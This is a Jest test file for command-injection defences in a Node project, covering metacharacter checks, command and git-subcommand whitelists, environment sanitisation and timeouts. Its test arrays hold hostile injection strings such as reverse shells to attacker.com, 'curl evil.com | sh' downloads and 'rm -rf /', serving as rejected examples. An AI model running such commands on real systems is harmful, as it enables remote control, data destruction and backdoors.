import { describe, test, expect, beforeAll } from '@jest/globals';
import { SecurityTestFramework } from '../setup.js';
import { spawn } from 'child_process';
import { promisify } from 'util';
import { exec as execCallback } from 'child_process';

const exec = promisify(execCallback);

describe('Command Injection Security Tests', () => {
  describe('Vulnerable exec() usage detection', () => {
    test('should reject command injection in git operations', async () => {
      const maliciousInputs = [
        'origin; rm -rf /',
        'origin && curl evil.com | sh',
        'origin | nc -e /bin/sh attacker.com 4444',
        'origin`touch /tmp/pwned`',
        'origin$(wget evil.com/shell.sh -O - | sh)'
      ];
      
      for (const input of maliciousInputs) {
        // Test that malicious input would be rejected
        expect(input).toMatch(/[;&|`$()]/);
        
        // In production, CommandValidator would reject these
        // We don't actually execute to avoid security issues in tests
      }
    });
    
    test('should reject command injection in npm operations', async () => {
      const maliciousPackages = [
        'express; echo "pwned" > /etc/passwd',
        'express || python -c "import os; os.system(\'whoami\')"',
        'express && rm -rf node_modules',
        'express\nwhoami',
        'express;curl evil.com/backdoor.js > index.js'
      ];
      
      for (const pkg of maliciousPackages) {
        // Test that malicious input would be rejected
        expect(pkg).toMatch(/[;&|`$()'\n]/);
        
        // In production, CommandValidator would reject these
      }
    });
  });
  
  describe('Secure spawn() implementation', () => {
    test('should safely execute commands with spawn', async () => {
      // Secure pattern using spawn without shell
      const result = await new Promise((resolve, reject) => {
        const proc = spawn('echo', ['safe input'], {
          shell: false // Critical: no shell interpretation
        });
        
        let output = '';
        proc.stdout.on('data', (data) => output += data);
        proc.on('close', (code) => {
          if (code === 0) resolve(output.trim());
          else reject(new Error(`Process exited with code ${code}`));
        });
      });
      
      expect(result).toBe('safe input');
    });
    
    test('should reject shell metacharacters in arguments', async () => {
      const dangerousArgs = [
        '; rm -rf /',
        '&& malicious-command',
        '| sensitive-data-exfil',
        '$(evil-command)',
        '`backdoor`'
      ];
      
      for (const arg of dangerousArgs) {
        // CommandValidator should reject these
        expect(() => {
          // Validate before execution
          if (/[;&|`$()]/.test(arg)) {
            throw new Error('Invalid characters in argument');
          }
        }).toThrow('Invalid characters in argument');
      }
    });
  });
  
  describe('Command whitelisting', () => {
    test('should only allow whitelisted commands', () => {
      const ALLOWED_COMMANDS = ['git', 'npm', 'node', 'npx'];
      
      const testCases = [
        { cmd: 'git', allowed: true },
        { cmd: 'npm', allowed: true },
        { cmd: 'rm', allowed: false },
        { cmd: 'curl', allowed: false },
        { cmd: 'wget', allowed: false },
        { cmd: '/bin/sh', allowed: false }
      ];
      
      for (const { cmd, allowed } of testCases) {
        if (allowed) {
          expect(ALLOWED_COMMANDS.includes(cmd)).toBe(true);
        } else {
          expect(ALLOWED_COMMANDS.includes(cmd)).toBe(false);
        }
      }
    });
    
    test('should validate git subcommands', () => {
      const ALLOWED_GIT_SUBCOMMANDS = ['pull', 'status', 'log', 'branch', 'checkout'];
      
      const testCases = [
        { subcmd: 'pull', allowed: true },
        { subcmd: 'status', allowed: true },
        { subcmd: 'push', allowed: false }, // Requires careful validation
        { subcmd: 'config', allowed: false }, // Can modify settings
        { subcmd: 'hooks', allowed: false } // Can execute arbitrary code
      ];
      
      for (const { subcmd, allowed } of testCases) {
        if (allowed) {
          expect(ALLOWED_GIT_SUBCOMMANDS.includes(subcmd)).toBe(true);
        } else {
          expect(ALLOWED_GIT_SUBCOMMANDS.includes(subcmd)).toBe(false);
        }
      }
    });
  });
  
  describe('Environment sanitization', () => {
    test('should restrict PATH environment variable', () => {
      const safePath = '/usr/bin:/bin:/usr/local/bin';
      const unsafePaths = [
        '/tmp:/usr/bin',
        './node_modules/.bin:/usr/bin',
        '/home/user/scripts:/usr/bin'
      ];
      
      expect(safePath).toMatch(/^(\/usr\/bin|\/bin|\/usr\/local\/bin)(:(\/usr\/bin|\/bin|\/usr\/local\/bin))*$/);
      
      for (const path of unsafePaths) {
        expect(path).not.toMatch(/^(\/usr\/bin|\/bin|\/usr\/local\/bin)(:(\/usr\/bin|\/bin|\/usr\/local\/bin))*$/);
      }
    });
    
    test('should remove dangerous environment variables', () => {
      const dangerousVars = ['LD_PRELOAD', 'LD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES'];
      const safeEnv = { ...process.env };
      
      for (const varName of dangerousVars) {
        delete safeEnv[varName];
      }
      
      for (const varName of dangerousVars) {
        expect(safeEnv[varName]).toBeUndefined();
      }
    });
  });
  
  describe('Timeout protection', () => {
    test('should enforce command timeouts', async () => {
      // Simulate long-running command that should timeout
      const timeout = 100; // 100ms for testing
      
      await expect(async () => {
        await new Promise((resolve, reject) => {
          const proc = spawn('sleep', ['5'], { timeout });
          proc.on('error', reject);
          proc.on('exit', (code) => {
            if (code === null) reject(new Error('Process killed by timeout'));
            else resolve(code);
          });
        });
      }).rejects.toThrow();
    });
  });
});